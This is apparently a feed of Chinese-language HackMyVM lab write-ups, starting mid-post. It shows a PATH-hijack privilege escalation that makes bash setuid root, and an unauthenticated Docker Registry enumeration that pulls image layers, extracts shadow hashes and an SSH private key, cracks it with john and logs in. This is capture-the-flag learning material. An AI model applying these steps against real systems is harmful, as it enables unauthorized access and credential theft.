sus2='N-ZA-Mn-za-m'

encoded_string=$(echo '$string' | tr $sus1 $sus2)

echo 'Original string: $string'
echo 'Encoded string: $encoded_string'
gh0st@friendly2:~$ ls -la /opt/
total 16
drwxr-xr-x  3 root root 4096 Apr 29  2023 .
drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
drwxr-xr-x  2 root root 4096 Apr 29  2023 0-day
-rwxr-xr-x  1 root root  561 Apr 29  2023 security.sh

```

实现用户输入不超20个字符且不能有特殊符号，将输入信息ROT13 编码，我们改个环境变量就好了，它没用绝对路径

```bash
gh0st@friendly2:/tmp$ echo 'chmod u+s /bin/bash' &gt; grep
gh0st@friendly2:/tmp$ chmod +x grep 
gh0st@friendly2:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
gh0st@friendly2:/tmp$ sudo PATH=$PWD:$PATH /opt/security.sh
Enter the string to encode:
aaassss
The string cannot contain special characters.
gh0st@friendly2:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
gh0st@friendly2:/tmp$ bash -p
bash-5.1# id
uid=1001(gh0st) gid=1001(gh0st) euid=0(root) groups=1001(gh0st)
bash-5.1# cat /root/
.bash_history  .bashrc        interfaces.sh  .local/        .profile       root.txt     
bash-5.1# cat /root/root.txt 
Not yet! Try to find root.txt.


Hint: ...
bash-5.1# find / -name '...' 2&gt;/dev/null
/...
bash-5.1# cd /.../
bash-5.1# ls -al
total 12
d-wx------  2 root root 4096 Apr 29  2023 .
drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
-r--------  1 root root  100 Apr 29  2023 ebbg.txt
bash-5.1# cat ebbg.txt 
It's codified, look the cipher:

98199n723q0s44s6rs39r33685q8pnoq



Hint: numbers are not codified

```

![Image](https://github.com/user-attachments/assets/f1d96202-91e2-4915-adb2-fd428994419b)。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_friendly2.html</guid><pubDate>Fri, 27 Jun 2025 09:33:10 +0000</pubDate></item><item><title>hmv_flossy</title><link>https://7r1UMPHK.github.io/post/hmv_flossy.html</link><description># hmv_flossy

# 0.简介

**靶机**：[hackmyvm - flossy](https://hackmyvm.eu/machines/machine.php?vm=flossy)
**难度**：黄色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-17 16:18 CST
Nmap scan report for 192.168.205.138
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:61:56:42 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds

```

先看**80端口**，**22端口**候补

# 2.踩点

![Image](https://github.com/user-attachments/assets/b9a4753b-3614-43d8-adff-220881ce04cd)

一个查询页面，可以输入数值进行查询，有效范围是**1-99**，后面的数据是重复的。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_flossy.html</guid><pubDate>Fri, 27 Jun 2025 09:33:08 +0000</pubDate></item><item><title>hmv_espo</title><link>https://7r1UMPHK.github.io/post/hmv_espo.html</link><description># hmv_espo

# 0.简介

**靶机**：[hackmyvm - espo](https://hackmyvm.eu/machines/machine.php?vm=espo)
**难度**：黄色
**目标 IP**：192.168.205.236
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS -p- -Pn -n -T4 192.168.205.236
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 13:19 CST
Nmap scan report for 192.168.205.236
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:9F:01:54 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds                                                            
```

---

# 2.踩点

![image](https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3)

是个登录栏，搜索一下有没有什么漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ whatweb http://192.168.205.236                                     
http://192.168.205.236 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.205.236], PHP[8.2.7], PoweredBy[EspoCRM], Script[text/javascript], Title[EspoCRM], UncommonHeaders[x-content-type-options,content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.2.7], nginx
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ searchsploit EspoCRM
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
EspoCRM 5.8.5 - Privilege Escalation                                                                | multiple/webapps/48376.txt
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                 
```

只有权限提升漏洞，但是我们没有用户。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_espo.html</guid><pubDate>Fri, 27 Jun 2025 09:33:05 +0000</pubDate></item><item><title>hmv_Doll</title><link>https://7r1UMPHK.github.io/post/hmv_Doll.html</link><description># hmv_Doll

# 0.闲聊

![image](assets/image-20250129201949-6vewhf4.png)

**靶机：** https://hackmyvm.eu/machines/machine.php?vm=Doll

**靶机 IP：** 192.168.72.129

**kali IP：** 192.168.72.128

今天年初二，有点空，更新一下wp

# 1.扫描

​`nmap`​开扫

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS -Pn -n -p- --min-rate 10000 192.168.72.129
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:16 EST
Nmap scan report for 192.168.72.129
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1007/tcp open  unknown
MAC Address: 08:00:27:F7:F4:53 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
                                                                  
```

其中`1007`​不知道是什么服务，我们详细扫描一下

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sT -sV -Pn -n -p1007 192.168.72.129        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:17 EST
Nmap scan report for 192.168.72.129
Host is up (0.00039s latency).

PORT     STATE SERVICE VERSION
1007/tcp open  http    Docker Registry (API: 2.0)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds

```

不知道是什么东西，我们等会搜索一下

# 2.踩点

在**hacktricks**​上找到[5000 - Pentesting Docker Registry](https://book.hacktricks.wiki/zh/network-services-pentesting/5000-pentesting-docker-registry.html)这篇文章

![image](assets/image-20250129202845-u4dct3k.png)

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.72.129:1007/v2/_catalog
{'repositories':['dolly']}
                              
```

继续利用

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.72.129:1007/v2/dolly/tags/list
{'name':'dolly','tags':['latest']}
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.72.129:1007/v2/dolly/manifests/latest
{
   'schemaVersion': 1,
   'name': 'dolly',
   'tag': 'latest',
   'architecture': 'amd64',
   'fsLayers': [
      {
         'blobSum': 'sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017'
      },
      {
         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
      },
      {
         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
      },
      {
         'blobSum': 'sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09'
      }
   ],
   'history': [
      {
         'v1Compatibility': '{\'architecture\':\'amd64\',\'config\':{\'Hostname\':\'10ddd4608cdf\',\'Domainname\':\'\',\'User\':\'\',\'AttachStdin\':true,\'AttachStdout\':true,\'AttachStderr\':true,\'Tty\':true,\'OpenStdin\':true,\'StdinOnce\':true,\'Env\':[\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\'],\'Cmd\':[\'/bin/sh\'],\'Image\':\'doll\',\'Volumes\':null,\'WorkingDir\':\'\',\'Entrypoint\':null,\'OnBuild\':null,\'Labels\':{}},\'container\':\'10ddd4608cdfd81cd95111ecfa37499635f430b614fa326a6526eef17a215f06\',\'container_config\':{\'Hostname\':\'10ddd4608cdf\',\'Domainname\':\'\',\'User\':\'\',\'AttachStdin\':true,\'AttachStdout\':true,\'AttachStderr\':true,\'Tty\':true,\'OpenStdin\':true,\'StdinOnce\':true,\'Env\':[\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\'],\'Cmd\':[\'/bin/sh\'],\'Image\':\'doll\',\'Volumes\':null,\'WorkingDir\':\'\',\'Entrypoint\':null,\'OnBuild\':null,\'Labels\':{}},\'created\':\'2023-04-25T08:58:11.460540528Z\',\'docker_version\':\'23.0.4\',\'id\':\'89cefe32583c18fc5d6e6a5ffc138147094daac30a593800fe5b6615f2d34fd6\',\'os\':\'linux\',\'parent\':\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\'}'
      },
      {
         'v1Compatibility': '{\'id\':\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\',\'parent\':\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\',\'comment\':\'buildkit.dockerfile.v0\',\'created\':\'2023-03-29T18:19:24.45578926Z\',\'container_config\':{\'Cmd\':[\'ARG passwd=devilcollectsit\']},\'throwaway\':true}'
      },
      {
         'v1Compatibility': '{\'id\':\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\',\'parent\':\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\',\'created\':\'2023-03-29T18:19:24.45578926Z\',\'container_config\':{\'Cmd\':[\'/bin/sh -c #(nop)  CMD [\\\'/bin/sh\\\']\']},\'throwaway\':true}'
      },
      {
         'v1Compatibility': '{\'id\':\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\',\'created\':\'2023-03-29T18:19:24.348438709Z\',\'container_config\':{\'Cmd\':[\'/bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa78186e4ef0e7486ad55101cefc1fabbc1b385601bb38920 in / \']}}'
      }
   ],
   'signatures': [
      {
         'header': {
            'jwk': {
               'crv': 'P-256',
               'kid': 'X7W5:IVTA:CKTP:A6JJ:IMVJ:FOTQ:OO4M:CB4C:6JYB:PX6R:DQ6C:JPGS',
               'kty': 'EC',
               'x': 'm6jL0NHxYkVUo0-ID-HLzT0Y3OqOeOBvekpF98kC-4c',
               'y': 'WlToBayTJ8f4zcry3wiq1fMvedgRkuwE7Oycza83_YA'
            },
            'alg': 'ES256'
         },
         'signature': 'n75fkjkUhAvtqrT2JfMVuBUtIUgiZ0ZhgYmM4m9kqOHprKnq7YrMyNKYYTntkxDmN2uW2w_3o36LvmRW7KzyOg',
         'protected': 'eyJmb3JtYXRMZW5ndGgiOjI4MjksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNS0wMS0zMFQwMToyOTo0NVoifQ'
      }
   ]
}                                                                                                                                     

┌──(kali㉿kali)-[~/test]
└─$ mkdir tmp     
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cd tmp 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ curl http://192.168.72.129:1007/v2/dolly/blobs/sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017 -o blob1.tar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3707  100  3707    0     0   971k      0 --:--:-- --:--:-- --:--:-- 1206k
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ tar -xf blob1.tar
                         
┌──(kali㉿kali)-[~/test/tmp]
└─$ ls -la
总计 24
drwxrwxr-x 5 kali kali 4096  1月29日 20:32 .
drwxrwxr-x 4 kali kali 4096  1月29日 20:32 ..
-rw-rw-r-- 1 kali kali 3707  1月29日 20:32 blob1.tar
drwxr-xr-x 2 kali kali 4096 2023年 4月25日 etc
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 home
drwx------ 2 kali kali 4096 2023年 4月25日 root
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ cd etc 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/etc]
└─$ ls -al
总计 32
drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .
drwxrwxr-x 5 kali kali 4096  1月29日 20:32 ..
-rw-r--r-- 1 kali kali  710 2023年 4月25日 group
-rw-r--r-- 1 kali kali  697 2022年11月 4日 group-
-rw-r--r-- 1 kali kali 1223 2023年 4月25日 passwd
-rw-r--r-- 1 kali kali 1223 2023年 4月25日 passwd-
-rw-r----- 1 kali kali  553 2023年 4月25日 shadow
-rw-r----- 1 kali kali  448 2023年 4月25日 shadow-
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/etc]
└─$ cat *   
root:x:0:root
bin:x:1:root,bin,daemon
daemon:x:2:root,bin,daemon
sys:x:3:root,bin,adm
adm:x:4:root,adm,daemon
tty:x:5:
disk:x:6:root,adm
lp:x:7:lp
mem:x:8:
kmem:x:9:
wheel:x:10:root
floppy:x:11:root
mail:x:12:mail
news:x:13:news
uucp:x:14:uucp
man:x:15:man
cron:x:16:cron
console:x:17:
audio:x:18:
cdrom:x:19:
dialout:x:20:root
ftp:x:21:
sshd:x:22:
input:x:23:
at:x:25:at
tape:x:26:root
video:x:27:root
netdev:x:28:
readproc:x:30:
squid:x:31:squid
xfs:x:33:xfs
kvm:x:34:kvm
games:x:35:
shadow:x:42:
cdrw:x:80:
www-data:x:82:
usb:x:85:
vpopmail:x:89:
users:x:100:games
ntp:x:123:
nofiles:x:200:
smmsp:x:209:smmsp
locate:x:245:
abuild:x:300:
utmp:x:406:
ping:x:999:
nogroup:x:65533:
nobody:x:65534:
bela:x:1000:
root:x:0:root
bin:x:1:root,bin,daemon
daemon:x:2:root,bin,daemon
sys:x:3:root,bin,adm
adm:x:4:root,adm,daemon
tty:x:5:
disk:x:6:root,adm
lp:x:7:lp
mem:x:8:
kmem:x:9:
wheel:x:10:root
floppy:x:11:root
mail:x:12:mail
news:x:13:news
uucp:x:14:uucp
man:x:15:man
cron:x:16:cron
console:x:17:
audio:x:18:
cdrom:x:19:
dialout:x:20:root
ftp:x:21:
sshd:x:22:
input:x:23:
at:x:25:at
tape:x:26:root
video:x:27:root
netdev:x:28:
readproc:x:30:
squid:x:31:squid
xfs:x:33:xfs
kvm:x:34:kvm
games:x:35:
shadow:x:42:
cdrw:x:80:
www-data:x:82:
usb:x:85:
vpopmail:x:89:
users:x:100:games
ntp:x:123:
nofiles:x:200:
smmsp:x:209:smmsp
locate:x:245:
abuild:x:300:
utmp:x:406:
ping:x:999:
nogroup:x:65533:
nobody:x:65534:
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
root:*::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
bela:$6$azVVFjn.mkvh.lhA$yAXPBGOZDXRdDBmn3obtzhUzxwfDD7u3YIcixohpKzTGpJS0Oeu7UVoguhmwg4DHNM8K5z7Tn93BBaDadM/A5.:19472:0:99999:7:::
root:*::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
bela:!:19472:0:99999:7:::
                                 
┌──(kali㉿kali)-[~/test/tmp/etc]
└─$ cd ..                                
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ ls la 
ls: 无法访问 'la': 没有那个文件或目录
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ ls -la
总计 24
drwxrwxr-x 5 kali kali 4096  1月29日 20:32 .
drwxrwxr-x 4 kali kali 4096  1月29日 20:32 ..
-rw-rw-r-- 1 kali kali 3707  1月29日 20:32 blob1.tar
drwxr-xr-x 2 kali kali 4096 2023年 4月25日 etc
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 home
drwx------ 2 kali kali 4096 2023年 4月25日 root
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ cd home 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home]
└─$ ls -al
总计 12
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 .
drwxrwxr-x 5 kali kali 4096  1月29日 20:32 ..
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 bela
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home]
└─$ cd bela 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home/bela]
└─$ l -al 
总计 16
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ./
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ../
-rw------- 1 kali kali   57 2023年 4月25日 .ash_history
drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .ssh/
-rwxr-xr-x 1 kali kali    0 1969年12月31日 .wh..wh..opq*
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home/bela]
└─$ cat .ash_history                     
pwd
ls -la
mkdir .ssh
cd .ssh
nano id_rsa
vi id_rsa
exit
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home/bela]
└─$ cat .wh..wh..opq
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home/bela]
└─$ cd .ssh       
                                                                                                                                     
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ ls -al
总计 12
drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ..
-rw-r--r-- 1 kali kali 2635 2023年 4月25日 id_rsa
                                                                                                                                     
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ cat id_rsa    
-----BEGIN OPENSSH PRIVATE KEY-----
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
VtVwCw==
-----END OPENSSH PRIVATE KEY-----
                                             
```

省了，都不用爆破shadow了

```
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ ssh2john id_rsa &gt; hash
                                         
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:24 0.05% (ETA: 2025-01-31 17:41) 0g/s 105.4p/s 105.4c/s 105.4C/s passat..kicker
0g 0:00:01:39 0.06% (ETA: 2025-01-31 17:26) 0g/s 105.9p/s 105.9c/s 105.9C/s strokes..jhoan

```

爆破不出来，不会是用这个吧

![image](assets/image-20250129204242-qkg0s6r.png)

试试

```
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ chmod 600 id_rsa 

┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ ssh bela@192.168.72.129 -i id_rsa
ssh: connect to host 192.168.72.129 port 22: No route to host
                                                                                                                                     
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ ssh bela@192.168.72.129 -i id_rsa
Enter passphrase for key 'id_rsa': 
Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Apr 25 10:35:13 2023 from 192.168.0.100
bela@doll:~$ id
uid=1000(bela) gid=1000(bela) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

# 3.提权

```
bela@doll:~$ sudo -l
Matching Defaults entries for bela on doll:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bela may run the following commands on doll:
    (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337

```

